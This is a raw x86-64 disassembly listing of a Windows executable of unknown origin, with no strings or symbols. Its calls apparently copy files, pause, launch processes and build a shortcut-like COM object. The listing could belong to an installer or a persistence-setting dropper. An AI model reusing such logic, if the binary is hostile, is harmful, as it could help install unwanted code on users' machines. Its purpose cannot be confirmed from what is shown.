   1400033d3:	48 8d 15 1e c4 03 00 	lea    0x3c41e(%rip),%rdx        # 0x14003f7f8
   1400033da:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400033e1:	e8 fa 3c 00 00       	call   0x1400070e0
   1400033e6:	48 8d 15 43 c4 03 00 	lea    0x3c443(%rip),%rdx        # 0x14003f830
   1400033ed:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400033f4:	e8 e7 3c 00 00       	call   0x1400070e0
   1400033f9:	48 8d 15 80 c4 03 00 	lea    0x3c480(%rip),%rdx        # 0x14003f880
   140003400:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003407:	e8 d4 3c 00 00       	call   0x1400070e0
   14000340c:	48 8d 15 9d c4 03 00 	lea    0x3c49d(%rip),%rdx        # 0x14003f8b0
   140003413:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000341a:	e8 c1 3c 00 00       	call   0x1400070e0
   14000341f:	48 8d 15 c2 c4 03 00 	lea    0x3c4c2(%rip),%rdx        # 0x14003f8e8
   140003426:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000342d:	e8 ae 3c 00 00       	call   0x1400070e0
   140003432:	48 8d 15 e7 c4 03 00 	lea    0x3c4e7(%rip),%rdx        # 0x14003f920
   140003439:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003440:	e8 9b 3c 00 00       	call   0x1400070e0
   140003445:	48 8d 15 fc c4 03 00 	lea    0x3c4fc(%rip),%rdx        # 0x14003f948
   14000344c:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003453:	e8 88 3c 00 00       	call   0x1400070e0
   140003458:	48 8d 15 09 c5 03 00 	lea    0x3c509(%rip),%rdx        # 0x14003f968
   14000345f:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003466:	e8 75 3c 00 00       	call   0x1400070e0
   14000346b:	48 8d 15 0e c5 03 00 	lea    0x3c50e(%rip),%rdx        # 0x14003f980
   140003472:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003479:	e8 62 3c 00 00       	call   0x1400070e0
   14000347e:	48 8d 15 13 c5 03 00 	lea    0x3c513(%rip),%rdx        # 0x14003f998
   140003485:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000348c:	e8 4f 3c 00 00       	call   0x1400070e0
   140003491:	48 8d 15 10 c5 03 00 	lea    0x3c510(%rip),%rdx        # 0x14003f9a8
   140003498:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000349f:	e8 3c 3c 00 00       	call   0x1400070e0
   1400034a4:	48 8d 15 15 c5 03 00 	lea    0x3c515(%rip),%rdx        # 0x14003f9c0
   1400034ab:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400034b2:	e8 29 3c 00 00       	call   0x1400070e0
   1400034b7:	48 8d 15 1a c5 03 00 	lea    0x3c51a(%rip),%rdx        # 0x14003f9d8
   1400034be:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400034c5:	e8 16 3c 00 00       	call   0x1400070e0
   1400034ca:	48 8d 15 17 c5 03 00 	lea    0x3c517(%rip),%rdx        # 0x14003f9e8
   1400034d1:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400034d8:	e8 03 3c 00 00       	call   0x1400070e0
   1400034dd:	48 8d 15 0c c5 03 00 	lea    0x3c50c(%rip),%rdx        # 0x14003f9f0
   1400034e4:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400034eb:	e8 f0 3b 00 00       	call   0x1400070e0
   1400034f0:	48 8d 15 09 c5 03 00 	lea    0x3c509(%rip),%rdx        # 0x14003fa00
   1400034f7:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400034fe:	e8 dd 3b 00 00       	call   0x1400070e0
   140003503:	48 8d 15 06 c5 03 00 	lea    0x3c506(%rip),%rdx        # 0x14003fa10
   14000350a:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003511:	e8 ca 3b 00 00       	call   0x1400070e0
   140003516:	48 8d 15 fb c4 03 00 	lea    0x3c4fb(%rip),%rdx        # 0x14003fa18
   14000351d:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003524:	e8 b7 3b 00 00       	call   0x1400070e0
   140003529:	48 8d 15 10 c5 03 00 	lea    0x3c510(%rip),%rdx        # 0x14003fa40
   140003530:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003537:	e8 a4 3b 00 00       	call   0x1400070e0
   14000353c:	48 8d 15 1d c5 03 00 	lea    0x3c51d(%rip),%rdx        # 0x14003fa60
   140003543:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000354a:	e8 91 3b 00 00       	call   0x1400070e0
   14000354f:	48 8d 15 12 c5 03 00 	lea    0x3c512(%rip),%rdx        # 0x14003fa68
   140003556:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000355d:	e8 7e 3b 00 00       	call   0x1400070e0
   140003562:	48 8d 8d 18 01 00 00 	lea    0x118(%rbp),%rcx
   140003569:	e8 d2 2e 00 00       	call   0x140006440
   14000356e:	48 85 c0             	test   %rax,%rax
   140003571:	75 23                	jne    0x140003596
   140003573:	48 8b 85 10 01 00 00 	mov    0x110(%rbp),%rax
   14000357a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000357e:	48 8d 85 10 01 00 00 	lea    0x110(%rbp),%rax
   140003585:	48 03 c8             	add    %rax,%rcx
   140003588:	8b 51 10             	mov    0x10(%rcx),%edx
   14000358b:	83 ca 02             	or     $0x2,%edx
   14000358e:	45 33 c0             	xor    %r8d,%r8d
   140003591:	e8 da 2f 00 00       	call   0x140006570
   140003596:	e8 75 ef ff ff       	call   0x140002510
   14000359b:	4c 89 7d 90          	mov    %r15,-0x70(%rbp)
   14000359f:	4c 89 7d a0          	mov    %r15,-0x60(%rbp)
   1400035a3:	48 c7 45 a8 07 00 00 	movq   $0x7,-0x58(%rbp)
   1400035aa:	00 
   1400035ab:	66 44 89 7d 90       	mov    %r15w,-0x70(%rbp)
   1400035b0:	48 ff c3             	inc    %rbx
   1400035b3:	66 83 3c 58 00       	cmpw   $0x0,(%rax,%rbx,2)
   1400035b8:	75 f6                	jne    0x1400035b0
   1400035ba:	4c 8b c3             	mov    %rbx,%r8
   1400035bd:	48 8b d0             	mov    %rax,%rdx
   1400035c0:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400035c4:	e8 37 30 00 00       	call   0x140006600
   1400035c9:	90                   	nop
   1400035ca:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   1400035ce:	48 83 7d a8 08       	cmpq   $0x8,-0x58(%rbp)
   1400035d3:	4c 0f 43 4d 90       	cmovae -0x70(%rbp),%r9
   1400035d8:	4c 8d 85 50 04 00 00 	lea    0x450(%rbp),%r8
   1400035df:	48 8d 15 5a be 03 00 	lea    0x3be5a(%rip),%rdx        # 0x14003f440
   1400035e6:	48 8d 8d c0 12 00 00 	lea    0x12c0(%rbp),%rcx
   1400035ed:	e8 3e 39 00 00       	call   0x140006f30
   1400035f2:	45 33 c0             	xor    %r8d,%r8d
   1400035f5:	48 8d 95 c0 12 00 00 	lea    0x12c0(%rbp),%rdx
   1400035fc:	48 8d 0d 8d bf 03 00 	lea    0x3bf8d(%rip),%rcx        # 0x14003f590
   140003603:	ff 15 7f ca 02 00    	call   *0x2ca7f(%rip)        # 0x140030088
   140003609:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   14000360e:	ff 15 44 ca 02 00    	call   *0x2ca44(%rip)        # 0x140030058
   140003614:	48 8d 0d 75 bf 03 00 	lea    0x3bf75(%rip),%rcx        # 0x14003f590
   14000361b:	ff 15 47 ca 02 00    	call   *0x2ca47(%rip)        # 0x140030068
   140003621:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   140003625:	48 83 7d a8 08       	cmpq   $0x8,-0x58(%rbp)
   14000362a:	4c 0f 43 4d 90       	cmovae -0x70(%rbp),%r9
   14000362f:	4c 8d 85 50 04 00 00 	lea    0x450(%rbp),%r8
   140003636:	48 8d 15 9b bf 03 00 	lea    0x3bf9b(%rip),%rdx        # 0x14003f5d8
   14000363d:	48 8d 8d f0 18 00 00 	lea    0x18f0(%rbp),%rcx
   140003644:	e8 e7 38 00 00       	call   0x140006f30
   140003649:	45 33 c0             	xor    %r8d,%r8d
   14000364c:	48 8d 95 f0 18 00 00 	lea    0x18f0(%rbp),%rdx
   140003653:	48 8d 8d 90 0c 00 00 	lea    0xc90(%rbp),%rcx
   14000365a:	ff 15 28 ca 02 00    	call   *0x2ca28(%rip)        # 0x140030088
   140003660:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   140003665:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000366a:	45 33 c9             	xor    %r9d,%r9d
   14000366d:	4c 8d 85 b0 10 00 00 	lea    0x10b0(%rbp),%r8
   140003674:	48 8d 15 fd c3 03 00 	lea    0x3c3fd(%rip),%rdx        # 0x14003fa78
   14000367b:	33 c9                	xor    %ecx,%ecx
   14000367d:	ff 15 0d cd 02 00    	call   *0x2cd0d(%rip)        # 0x140030390
   140003683:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   140003688:	ff 15 ca c9 02 00    	call   *0x2c9ca(%rip)        # 0x140030058
   14000368e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003693:	e8 d0 67 00 00       	call   0x140009e68
   140003698:	48 89 85 90 27 00 00 	mov    %rax,0x2790(%rbp)
   14000369f:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400036a4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400036a9:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   1400036ae:	4c 8b c8             	mov    %rax,%r9
   1400036b1:	4c 8d 05 78 4e 00 00 	lea    0x4e78(%rip),%r8        # 0x140008530
   1400036b8:	33 d2                	xor    %edx,%edx
   1400036ba:	33 c9                	xor    %ecx,%ecx
   1400036bc:	e8 db ff 00 00       	call   0x14001369c
   1400036c1:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400036c6:	48 85 c0             	test   %rax,%rax
   1400036c9:	0f 84 cd 06 00 00    	je     0x140003d9c
   1400036cf:	83 7c 24 78 00       	cmpl   $0x0,0x78(%rsp)
   1400036d4:	0f 84 02 07 00 00    	je     0x140003ddc
   1400036da:	0f 28 44 24 70       	movaps 0x70(%rsp),%xmm0
   1400036df:	66 0f 7f 44 24 30    	movdqa %xmm0,0x30(%rsp)
   1400036e5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400036ea:	e8 f1 5f 00 00       	call   0x1400096e0
   1400036ef:	85 c0                	test   %eax,%eax
   1400036f1:	0f 85 f0 06 00 00    	jne    0x140003de7
   1400036f7:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   1400036fc:	ff 15 56 c9 02 00    	call   *0x2c956(%rip)        # 0x140030058
   140003702:	4c 8d 85 60 06 00 00 	lea    0x660(%rbp),%r8
   140003709:	48 8d 15 80 c3 03 00 	lea    0x3c380(%rip),%rdx        # 0x14003fa90
   140003710:	48 8d 8d 50 25 00 00 	lea    0x2550(%rbp),%rcx
   140003717:	e8 24 da ff ff       	call   0x140001140
   14000371c:	4c 89 bd 90 27 00 00 	mov    %r15,0x2790(%rbp)
   140003723:	4c 89 bd 98 27 00 00 	mov    %r15,0x2798(%rbp)
   14000372a:	33 c9                	xor    %ecx,%ecx
   14000372c:	ff 15 ae cc 02 00    	call   *0x2ccae(%rip)        # 0x1400303e0
   140003732:	48 8d 85 90 27 00 00 	lea    0x2790(%rbp),%rax
   140003739:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000373e:	4c 8d 0d bb cd 02 00 	lea    0x2cdbb(%rip),%r9        # 0x140030500
   140003745:	33 d2                	xor    %edx,%edx
   140003747:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000374b:	48 8d 0d ce cd 02 00 	lea    0x2cdce(%rip),%rcx        # 0x140030520
   140003752:	ff 15 70 cc 02 00    	call   *0x2cc70(%rip)        # 0x1400303c8
   140003758:	85 c0                	test   %eax,%eax
   14000375a:	0f 88 92 00 00 00    	js     0x1400037f2
   140003760:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140003767:	48 8b 01             	mov    (%rcx),%rax
   14000376a:	48 8d 95 80 0a 00 00 	lea    0xa80(%rbp),%rdx
   140003771:	ff 90 a0 00 00 00    	call   *0xa0(%rax)
   140003777:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   14000377e:	48 8b 01             	mov    (%rcx),%rax
   140003781:	48 8d 95 50 25 00 00 	lea    0x2550(%rbp),%rdx
   140003788:	ff 50 58             	call   *0x58(%rax)
   14000378b:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140003792:	48 8b 01             	mov    (%rcx),%rax
   140003795:	4c 8d 85 98 27 00 00 	lea    0x2798(%rbp),%r8
   14000379c:	48 8d 15 6d cd 02 00 	lea    0x2cd6d(%rip),%rdx        # 0x140030510
   1400037a3:	ff 10                	call   *(%rax)
   1400037a5:	85 c0                	test   %eax,%eax
   1400037a7:	79 0f                	jns    0x1400037b8
   1400037a9:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   1400037b0:	48 8b 01             	mov    (%rcx),%rax
   1400037b3:	ff 50 10             	call   *0x10(%rax)
   1400037b6:	eb 3a                	jmp    0x1400037f2
   1400037b8:	48 8b 8d 98 27 00 00 	mov    0x2798(%rbp),%rcx
   1400037bf:	48 8b 01             	mov    (%rcx),%rax
   1400037c2:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400037c8:	48 8d 95 a0 0e 00 00 	lea    0xea0(%rbp),%rdx
   1400037cf:	ff 50 30             	call   *0x30(%rax)
   1400037d2:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   1400037d9:	48 8b 01             	mov    (%rcx),%rax
   1400037dc:	ff 50 10             	call   *0x10(%rax)
   1400037df:	48 8b 8d 98 27 00 00 	mov    0x2798(%rbp),%rcx
   1400037e6:	48 8b 01             	mov    (%rcx),%rax
   1400037e9:	ff 50 10             	call   *0x10(%rax)
   1400037ec:	ff 15 de cb 02 00    	call   *0x2cbde(%rip)        # 0x1400303d0
   1400037f2:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   1400037f7:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400037fc:	45 33 c9             	xor    %r9d,%r9d
   1400037ff:	4c 8d 85 c0 12 00 00 	lea    0x12c0(%rbp),%r8
   140003806:	48 8d 15 6b c2 03 00 	lea    0x3c26b(%rip),%rdx        # 0x14003fa78
   14000380d:	33 c9                	xor    %ecx,%ecx
   14000380f:	ff 15 7b cb 02 00    	call   *0x2cb7b(%rip)        # 0x140030390
   140003815:	b9 70 17 00 00       	mov    $0x1770,%ecx
   14000381a:	ff 15 38 c8 02 00    	call   *0x2c838(%rip)        # 0x140030058
   140003820:	48 8d 8d a0 0e 00 00 	lea    0xea0(%rbp),%rcx
   140003827:	ff 15 3b c8 02 00    	call   *0x2c83b(%rip)        # 0x140030068
   14000382d:	48 8d 8d 80 0a 00 00 	lea    0xa80(%rbp),%rcx
   140003834:	ff 15 2e c8 02 00    	call   *0x2c82e(%rip)        # 0x140030068
   14000383a:	48 8d 8d e0 16 00 00 	lea    0x16e0(%rbp),%rcx
   140003841:	ff 15 21 c8 02 00    	call   *0x2c821(%rip)        # 0x140030068
   140003847:	48 8d 8d 90 0c 00 00 	lea    0xc90(%rbp),%rcx
   14000384e:	ff 15 14 c8 02 00    	call   *0x2c814(%rip)        # 0x140030068
   140003854:	48 8d 8d b0 10 00 00 	lea    0x10b0(%rbp),%rcx
   14000385b:	ff 15 07 c8 02 00    	call   *0x2c807(%rip)        # 0x140030068
   140003861:	48 8d 8d f0 18 00 00 	lea    0x18f0(%rbp),%rcx
   140003868:	ff 15 fa c7 02 00    	call   *0x2c7fa(%rip)        # 0x140030068
   14000386e:	48 8d 8d c0 12 00 00 	lea    0x12c0(%rbp),%rcx
   140003875:	ff 15 ed c7 02 00    	call   *0x2c7ed(%rip)        # 0x140030068
   14000387b:	48 8d 0d 9e b9 03 00 	lea    0x3b99e(%rip),%rcx        # 0x14003f220
   140003882:	ff 15 e0 c7 02 00    	call   *0x2c7e0(%rip)        # 0x140030068
   140003888:	90                   	nop
   140003889:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
   14000388d:	48 83 fa 08          	cmp    $0x8,%rdx
   140003891:	72 36                	jb     0x1400038c9
   140003893:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000389a:	00 
   14000389b:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   14000389f:	48 8b c1             	mov    %rcx,%rax
   1400038a2:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400038a9:	72 19                	jb     0x1400038c4
   1400038ab:	48 83 c2 27          	add    $0x27,%rdx
   1400038af:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400038b3:	48 2b c1             	sub    %rcx,%rax
   1400038b6:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400038ba:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400038be:	0f 87 2b 05 00 00    	ja     0x140003def
   1400038c4:	e8 97 65 00 00       	call   0x140009e60
   1400038c9:	4c 89 7d a0          	mov    %r15,-0x60(%rbp)
   1400038cd:	48 c7 45 a8 07 00 00 	movq   $0x7,-0x58(%rbp)
   1400038d4:	00 
   1400038d5:	66 44 89 7d 90       	mov    %r15w,-0x70(%rbp)
   1400038da:	48 8b 85 10 01 00 00 	mov    0x110(%rbp),%rax
   1400038e1:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400038e5:	48 8d 05 b4 c6 03 00 	lea    0x3c6b4(%rip),%rax        # 0x14003ffa0
   1400038ec:	48 89 84 0d 10 01 00 	mov    %rax,0x110(%rbp,%rcx,1)
   1400038f3:	00 
   1400038f4:	48 8b 85 10 01 00 00 	mov    0x110(%rbp),%rax
   1400038fb:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400038ff:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003905:	89 94 0d 0c 01 00 00 	mov    %edx,0x10c(%rbp,%rcx,1)
   14000390c:	48 8d 8d 18 01 00 00 	lea    0x118(%rbp),%rcx
   140003913:	e8 08 1f 00 00       	call   0x140005820
   140003918:	48 8b 85 10 01 00 00 	mov    0x110(%rbp),%rax
   14000391f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003923:	48 8d 05 ee c6 03 00 	lea    0x3c6ee(%rip),%rax        # 0x140040018
   14000392a:	48 89 84 0d 10 01 00 	mov    %rax,0x110(%rbp,%rcx,1)
   140003931:	00 
   140003932:	48 8b 85 10 01 00 00 	mov    0x110(%rbp),%rax
   140003939:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000393d:	8d 51 f0             	lea    -0x10(%rcx),%edx
   140003940:	89 94 0d 0c 01 00 00 	mov    %edx,0x10c(%rbp,%rcx,1)
   140003947:	48 8d 05 ba c5 03 00 	lea    0x3c5ba(%rip),%rax        # 0x14003ff08
   14000394e:	48 89 85 b8 01 00 00 	mov    %rax,0x1b8(%rbp)
   140003955:	48 8d 8d b8 01 00 00 	lea    0x1b8(%rbp),%rcx
   14000395c:	e8 4b 56 00 00       	call   0x140008fac
   140003961:	90                   	nop
   140003962:	48 8b 95 08 01 00 00 	mov    0x108(%rbp),%rdx
   140003969:	48 83 fa 10          	cmp    $0x10,%rdx
   14000396d:	72 34                	jb     0x1400039a3
   14000396f:	48 ff c2             	inc    %rdx
   140003972:	48 8b 8d f0 00 00 00 	mov    0xf0(%rbp),%rcx
   140003979:	48 8b c1             	mov    %rcx,%rax
   14000397c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003983:	72 19                	jb     0x14000399e
   140003985:	48 83 c2 27          	add    $0x27,%rdx
   140003989:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000398d:	48 2b c1             	sub    %rcx,%rax
   140003990:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003994:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003998:	0f 87 57 04 00 00    	ja     0x140003df5
   14000399e:	e8 bd 64 00 00       	call   0x140009e60
   1400039a3:	4c 89 bd 00 01 00 00 	mov    %r15,0x100(%rbp)
   1400039aa:	48 c7 85 08 01 00 00 	movq   $0xf,0x108(%rbp)
   1400039b1:	0f 00 00 00 
   1400039b5:	c6 85 f0 00 00 00 00 	movb   $0x0,0xf0(%rbp)
   1400039bc:	48 8b 95 a8 00 00 00 	mov    0xa8(%rbp),%rdx
   1400039c3:	48 83 fa 10          	cmp    $0x10,%rdx
   1400039c7:	72 34                	jb     0x1400039fd
   1400039c9:	48 ff c2             	inc    %rdx
   1400039cc:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   1400039d3:	48 8b c1             	mov    %rcx,%rax
   1400039d6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400039dd:	72 19                	jb     0x1400039f8
   1400039df:	48 83 c2 27          	add    $0x27,%rdx
   1400039e3:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400039e7:	48 2b c1             	sub    %rcx,%rax
   1400039ea:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400039ee:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400039f2:	0f 87 03 04 00 00    	ja     0x140003dfb
   1400039f8:	e8 63 64 00 00       	call   0x140009e60
   1400039fd:	4c 89 bd a0 00 00 00 	mov    %r15,0xa0(%rbp)
   140003a04:	48 c7 85 a8 00 00 00 	movq   $0xf,0xa8(%rbp)
   140003a0b:	0f 00 00 00 
   140003a0f:	c6 85 90 00 00 00 00 	movb   $0x0,0x90(%rbp)
   140003a16:	48 8b 95 c8 00 00 00 	mov    0xc8(%rbp),%rdx
   140003a1d:	48 83 fa 10          	cmp    $0x10,%rdx
   140003a21:	72 34                	jb     0x140003a57
   140003a23:	48 ff c2             	inc    %rdx
   140003a26:	48 8b 8d b0 00 00 00 	mov    0xb0(%rbp),%rcx
   140003a2d:	48 8b c1             	mov    %rcx,%rax
   140003a30:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003a37:	72 19                	jb     0x140003a52
   140003a39:	48 83 c2 27          	add    $0x27,%rdx
   140003a3d:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003a41:	48 2b c1             	sub    %rcx,%rax
   140003a44:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003a48:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003a4c:	0f 87 af 03 00 00    	ja     0x140003e01
   140003a52:	e8 09 64 00 00       	call   0x140009e60
   140003a57:	4c 89 bd c0 00 00 00 	mov    %r15,0xc0(%rbp)
   140003a5e:	48 c7 85 c8 00 00 00 	movq   $0xf,0xc8(%rbp)
   140003a65:	0f 00 00 00 
   140003a69:	c6 85 b0 00 00 00 00 	movb   $0x0,0xb0(%rbp)
   140003a70:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   140003a74:	48 83 fa 08          	cmp    $0x8,%rdx
   140003a78:	72 36                	jb     0x140003ab0
   140003a7a:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003a81:	00 
   140003a82:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   140003a86:	48 8b c1             	mov    %rcx,%rax
   140003a89:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003a90:	72 19                	jb     0x140003aab
   140003a92:	48 83 c2 27          	add    $0x27,%rdx
   140003a96:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003a9a:	48 2b c1             	sub    %rcx,%rax
   140003a9d:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003aa1:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003aa5:	0f 87 5c 03 00 00    	ja     0x140003e07
   140003aab:	e8 b0 63 00 00       	call   0x140009e60
   140003ab0:	4c 89 7d c0          	mov    %r15,-0x40(%rbp)
   140003ab4:	48 c7 45 c8 07 00 00 	movq   $0x7,-0x38(%rbp)
   140003abb:	00 
   140003abc:	66 44 89 7d b0       	mov    %r15w,-0x50(%rbp)
   140003ac1:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003ac5:	48 83 fa 08          	cmp    $0x8,%rdx
   140003ac9:	72 36                	jb     0x140003b01
   140003acb:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003ad2:	00 
   140003ad3:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140003ad7:	48 8b c1             	mov    %rcx,%rax
   140003ada:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003ae1:	72 19                	jb     0x140003afc
   140003ae3:	48 83 c2 27          	add    $0x27,%rdx
   140003ae7:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003aeb:	48 2b c1             	sub    %rcx,%rax
   140003aee:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003af2:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003af6:	0f 87 11 03 00 00    	ja     0x140003e0d
   140003afc:	e8 5f 63 00 00       	call   0x140009e60
   140003b01:	4c 89 7d e0          	mov    %r15,-0x20(%rbp)
   140003b05:	48 c7 45 e8 07 00 00 	movq   $0x7,-0x18(%rbp)
   140003b0c:	00 
   140003b0d:	66 44 89 7d d0       	mov    %r15w,-0x30(%rbp)
   140003b12:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140003b16:	48 83 fa 08          	cmp    $0x8,%rdx
   140003b1a:	72 36                	jb     0x140003b52
   140003b1c:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003b23:	00 
   140003b24:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   140003b28:	48 8b c1             	mov    %rcx,%rax
   140003b2b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003b32:	72 19                	jb     0x140003b4d
   140003b34:	48 83 c2 27          	add    $0x27,%rdx
   140003b38:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003b3c:	48 2b c1             	sub    %rcx,%rax
   140003b3f:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003b43:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003b47:	0f 87 c6 02 00 00    	ja     0x140003e13
   140003b4d:	e8 0e 63 00 00       	call   0x140009e60
   140003b52:	4c 89 7d 20          	mov    %r15,0x20(%rbp)
   140003b56:	48 c7 45 28 07 00 00 	movq   $0x7,0x28(%rbp)
   140003b5d:	00 
   140003b5e:	66 44 89 7d 10       	mov    %r15w,0x10(%rbp)
   140003b63:	48 8b 55 08          	mov    0x8(%rbp),%rdx
   140003b67:	48 83 fa 08          	cmp    $0x8,%rdx
   140003b6b:	72 37                	jb     0x140003ba4
   140003b6d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003b74:	00 
   140003b75:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003b79:	48 8b c1             	mov    %rcx,%rax
   140003b7c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003b83:	72 19                	jb     0x140003b9e
   140003b85:	48 83 c2 27          	add    $0x27,%rdx
   140003b89:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003b8d:	48 2b c1             	sub    %rcx,%rax
   140003b90:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003b94:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003b98:	0f 87 7b 02 00 00    	ja     0x140003e19
   140003b9e:	e8 bd 62 00 00       	call   0x140009e60
   140003ba3:	90                   	nop
   140003ba4:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140003ba8:	48 83 fa 08          	cmp    $0x8,%rdx
   140003bac:	72 36                	jb     0x140003be4
   140003bae:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003bb5:	00 
   140003bb6:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140003bba:	48 8b c1             	mov    %rcx,%rax
   140003bbd:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003bc4:	72 19                	jb     0x140003bdf
   140003bc6:	48 83 c2 27          	add    $0x27,%rdx
   140003bca:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003bce:	48 2b c1             	sub    %rcx,%rax
   140003bd1:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003bd5:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003bd9:	0f 87 40 02 00 00    	ja     0x140003e1f
   140003bdf:	e8 7c 62 00 00       	call   0x140009e60
   140003be4:	4c 89 7d 40          	mov    %r15,0x40(%rbp)
   140003be8:	48 c7 45 48 07 00 00 	movq   $0x7,0x48(%rbp)
   140003bef:	00 
   140003bf0:	66 44 89 7d 30       	mov    %r15w,0x30(%rbp)
   140003bf5:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   140003bf9:	48 83 fa 08          	cmp    $0x8,%rdx
   140003bfd:	72 36                	jb     0x140003c35
   140003bff:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003c06:	00 
   140003c07:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140003c0b:	48 8b c1             	mov    %rcx,%rax
